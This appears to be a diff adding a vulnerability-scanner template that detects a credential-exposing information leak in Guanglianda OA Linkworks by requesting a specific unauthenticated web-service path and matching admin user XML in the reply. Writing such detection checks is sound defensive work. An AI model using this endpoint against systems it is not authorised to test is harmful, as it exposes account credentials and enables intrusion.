@@ -1,0 +1,25 @@
+id: guanglianda-oa-information-leak
+info:
+  name: Guanglianda OA Linkworks Information Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: information-leak
+  description: |
+    Guanglianda OA Linkworks system information leak that exposes account credentials.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Org/service/Service.asmx/GetUserXml4GEPS"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "<?xml version=\"1.0\" encoding=\"utf-8\"?>"
+          - "<USR_CODE>admin</USR_CODE><USR_NAME>管理员<"
